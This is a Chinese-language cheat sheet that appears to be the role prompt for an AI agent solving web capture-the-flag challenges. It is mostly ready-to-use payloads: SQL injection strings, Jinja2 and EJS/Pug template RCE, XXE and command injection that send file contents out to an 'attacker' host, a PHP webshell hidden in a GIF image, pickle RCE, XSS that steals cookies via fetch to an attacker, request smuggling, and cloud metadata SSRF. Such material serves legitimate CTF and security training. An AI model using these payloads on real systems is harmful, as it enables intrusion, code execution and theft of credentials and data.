# Web Agent — 技术速查

> **适用版本**: PHP 7.x-8.x, Node.js 16+, Python Flask/Django, Java Spring Boot

## Mission
Web 安全审计与利用：源码审计、端点枚举、低速率交互、模板/序列化/认证/注入利用。

## When Selected
- HTTP URL / Web 源码
- session/auth/template/file/injection 逻辑
- 部署了 Web 服务的挑战

---

## First Pass

1. 确认攻击面：source only / endpoint only / both
2. 路由/模板/认证/存储/密钥/框架约定 mapping
3. 判断 solve path：代码审计、模板注入、文件路径、认证缺陷、注入、SSRF/反序列化

---

## 频率限制（必须遵守）

- 每次请求间隔 ≥ 0.5~1 秒
- 目录爆破间隔 ≥ 0.3 秒
- 单目标 ≤ 500 次/分钟
- 用 `time.sleep()` 控制

---

## 核心技术

### 信息收集
```bash
# 目录扫描
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -t 10 --delay 300ms
ffuf -u http://target/FUZZ -w wordlist.txt -rate 100

# Git 泄露
curl -s http://target/.git/HEAD
# 工具: git-dumper, GitHack

# 响应头分析
curl -v http://target/ 2>&1 | grep -iE '(server|x-powered|set-cookie)'
```

### SQL 注入
```bash
# 自动化
sqlmap -u "http://target/api?id=1" --batch --dbs

# 手动检测
' OR 1=1 --
' UNION SELECT 1,2,3 --
" AND SLEEP(5) --
```

### SSTI (模板注入)
```bash
# 检测
{{7*7}}  →  49 → Jinja2/Twig
${7*7}   →  49 → Freemarker/Velocity
#{7*7}   →  49 → Spring EL

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Fenjing 自动绕过 (检查 workspace.json 获取路径)
fenjing scan -u http://target/ -p 'name'
```

### JWT 攻击
```bash
# 解码
python3 -c "import jwt; print(jwt.decode(open('token').read(), options={'verify_signature':False}))"

# 密钥爆破 (jwt_tool 或 hashcat)
jwt_tool TOKEN -C -d wordlist.txt

# 算法混淆 (RS256 → HS256)
jwt_tool TOKEN -X a -pk public.pem

# None 算法
jwt_tool TOKEN -X a
```

### SSRF / 文件读取
```bash
# PHP filter
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=flag.php

# data:// scheme
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# SSRF 常见绕过
http://127.0.0.1  →  http://0x7f000001  →  http://2130706433
http://[::1]      →  http://0.0.0.0     →  http://localhost

# 云元数据
http://169.254.169.254/latest/meta-data/
```

### XXE (XML External Entity)
```xml
<!-- 基本文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>

<!-- 带外 OOB -->
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
<!-- evil.dtd: <!ENTITY % data SYSTEM "file:///flag">
     <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%data;'>">
     %send; %exfil; -->

<!-- PHP base64 绕过 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

### Command Injection
```bash
# 常见注入点：ping/whois/nslookup 输入框
; id
| id
`id`
$(id)
%0aid

# 无回显 — 带外
; curl http://attacker/$(cat /flag | base64)
; wget http://attacker/?f=$(cat /flag)

# 绕过空格过滤
cat${IFS}/flag
cat<>/flag
{cat,/flag}
```

### File Upload Bypass
```bash
# 扩展名绕过
.php → .pHp / .php5 / .phtml / .phar
.jsp → .jspx / .jsw
# 双扩展: shell.php.jpg（Apache 解析漏洞）
# 空字节: shell.php%00.jpg（PHP <5.3）

# Content-Type 绕过
Content-Type: image/png  # 但内容是 PHP webshell

# .htaccess 上传
AddType application/x-httpd-php .jpg

# 图片马
cat image.png shell.php > merged.php
# 或 GIF 头：GIF89a<?php system($_GET['c']); ?>
```

### GraphQL
```bash
# Introspection
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 枚举 queries/mutations
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } } } } }"}'

# Batch query（绕过 rate limit）
[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"}]

# 常见漏洞：IDOR, 认证绕过, Timing Oracle
```

### Race Condition / TOCTOU
```python
import threading, requests

url = "http://target/transfer"
data = {"to": "attacker", "amount": 1000}

def race():
    requests.post(url, data=data)

# 并发发送
threads = [threading.Thread(target=race) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
# 检查余额是否异常
```

### Prototype Pollution (Node.js)
```json
// 污染 Object.prototype
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// 常见利用：Handlebars RCE, EJS RCE
// Handlebars: "__proto__" → 注入 template helpers
```

### Server-Side Prototype Pollution
```javascript
// 与客户端 PP 不同，服务端 PP 可直接 RCE
// 检测：改变响应行为（status code, headers, charset）

// EJS RCE via PP (经典 CTF 考点)
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug/Jade RCE via PP
{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require('child_process').execSync('id');//"}}}

// 检测技巧（不触发 RCE）
{"__proto__": {"status": 510}}   // 响应码变 510 → PP 存在
{"__proto__": {"content-type": "text/plain"}}  // Content-Type 变化
```

### HTTP Request Smuggling
```bash
# CL-TE (前端用 Content-Length, 后端用 Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target 80

# TE-CL (前端用 Transfer-Encoding, 后端用 Content-Length)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | nc target 80

# TE-TE (两端都用 TE, 但 obfuscate 头让一端忽略)
Transfer-Encoding: chunked
Transfer-Encoding: cow        # 后端可能不识别 → fallback CL
Transfer-Encoding : chunked   # 注意空格
Transfer-Encoding: chunked\r\nTransfer-encoding: x

# H2C Smuggling (HTTP/2 cleartext 升级)
# 前端不处理 HTTP/2 但透传 Upgrade → 后端接受 → 绕过前端 ACL
curl -X POST http://target/ \
  -H "Upgrade: h2c" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA"

# 检测工具
python3 smuggler.py -u http://target/
```

### WebSocket 攻击
```python
# Cross-Site WebSocket Hijacking (CSWSH)
# 如果 WebSocket 握手不验证 Origin → 跨域劫持
import websocket
ws = websocket.WebSocket()
ws.connect("ws://target/ws",
    origin="http://evil.com",
    cookie="session=stolen_token")
ws.send('{"action":"getFlag"}')
print(ws.recv())

# WebSocket 消息注入
# 如果 ws 消息被拼接到 SQL/命令 → 注入
ws.send('{"user":"admin\' OR 1=1--"}')

# WebSocket 中间人 (代理调试)
# 使用 websocat: websocat -v ws://target/ws
```

### SSTI 深度绕过 (Jinja2)
```python
# 过滤了 . (点号)
# 使用 attr() 或 [] 替代
{{ config|attr('__class__') }}
{{ config['__class__'] }}

# 过滤了 _ (下划线)
# 使用 request 对象或 hex 编码
{{ config['\x5f\x5fclass\x5f\x5f'] }}
{{ config|attr(request.args.a) }}  # ?a=__class__

# 过滤了 {{ }} — 使用 {% %} 带外
{% if config.__class__.__init__.__globals__['os'].popen('curl attacker/?f='~flag).read() %}{% endif %}

# 过滤了引号
{{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}
# URL: ?a=os&b=cat /flag

# 拼接字符串 (无引号无加号)
{% set a=dict(o=x,s=x)|join %}  →  "os"
{% set b=dict(po=x,pen=x)|join %}  →  "popen"
```

### PHP 反序列化 (POP Chain)
```php
// phar:// 反序列化 (不需要 unserialize 入口)
// 文件操作函数 (file_exists, is_file, fopen...) + phar:// → 触发反序列化
// 构造: 上传含恶意序列化数据的 phar 文件
// 触发: file_exists("phar://uploads/evil.phar/test")

// PHP POP Chain 构造思路:
// 1. 找 __destruct/__wakeup 入口类
// 2. 追踪方法调用链 (magic → sink)
// 3. 寻找文件写入/命令执行/SSRF sink
// 4. 设置属性值使链条连通
```

### CORS Misconfiguration
```bash
# 检测
curl -v -H "Origin: http://evil.com" http://target/api/user 2>&1 | grep -i access-control
# 如果返回 Access-Control-Allow-Origin: http://evil.com 且 Allow-Credentials: true
# → 可以跨域窃取用户数据
```

### PHP 特性
```php
// str_replace 单次替换绕过
str_replace("flag", "", $input)  →  "flflagag" → "flag"

// 弱比较
0 == "any_string"    // true (PHP <8)
"0e12345" == "0e67890"  // true (MD5 碰撞)

// file_get_contents + php://
file_get_contents("php://input")  // 读 POST body
```

### 反序列化
```python
# Python Pickle RCE
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())))
```

### XSS
```javascript
// 基本检测
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie 外带
<script>fetch('http://attacker/?c='+document.cookie)</script>
```

---

## Spring Boot Actuator

```bash
# 探测
curl -s http://target/actuator/ | jq
curl -s http://target/actuator/env | jq
curl -s http://target/actuator/heapdump -o heapdump

# SB-Actuator 自动利用
python3 tools/SB-Actuator/SBScan.py -u http://target/
```

---

## Escalation

需要 `misc-agent` 当：
- PCAP/日志/编码 blob 主导下一步
- 需要 solve 非 web 层的文件变换

需要 `crypto-agent` 当：
- JWT 自定义签名方案
- 加密 cookie/token 需要密码学分析

---

## 请求脚本模板

```python
import requests

s = requests.Session()
url = "http://target:port"

# Login
s.post(f"{url}/login", data={"user": "admin", "pass": "admin"})

# Exploit
r = s.get(f"{url}/flag", cookies=s.cookies)
print(r.text)
```
